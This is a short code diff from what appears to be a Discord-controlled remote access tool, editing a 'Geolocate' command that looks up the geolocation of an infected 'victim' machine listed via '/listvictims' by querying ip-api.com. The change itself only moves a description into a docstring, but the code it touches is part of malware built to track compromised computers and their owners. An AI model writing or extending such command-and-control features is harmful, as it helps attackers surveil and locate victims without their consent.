@@ -10,12 +10,15 @@ class Geolocate(commands.Cog):
         self.bot = bot
         self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Finds all geolocation information of victim",
-        options=[bot.victim],
-    )
+    @commands.slash_command( )
     async def get_geolocation(self, ctx, victim):
-        if str(victim) == str(self.ip_addr):
+        """Finds all geolocation information of victim
+        
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
             
             data = requests.get("http://ip-api.com/json/").json()
